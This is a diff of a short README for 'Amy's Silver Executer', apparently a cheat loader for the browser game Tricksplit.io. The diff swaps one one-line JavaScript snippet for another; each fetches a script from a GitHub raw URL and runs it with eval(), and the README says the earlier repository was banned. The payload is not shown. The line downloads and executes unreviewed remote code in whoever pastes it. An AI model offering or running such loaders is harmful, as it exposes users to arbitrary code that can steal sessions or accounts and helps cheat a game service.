@@ -1,7 +1,7 @@
 # {Tricksplit.io} *1.7.2*! 
 # Amy's Silver Executer
 ```js
-fetch(`https://raw.githubusercontent.com/NightScripts-API/exploit/main/api.js`).then(data=>{data.text().then(text=>{eval(text)})});
+fetch(`https://raw.githubusercontent.com/GModule/Tricksplit/main/inject.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
 **Re-Released** *The old GITHUB was banned, I do not know why but this one will be updated!?*
 # Creator
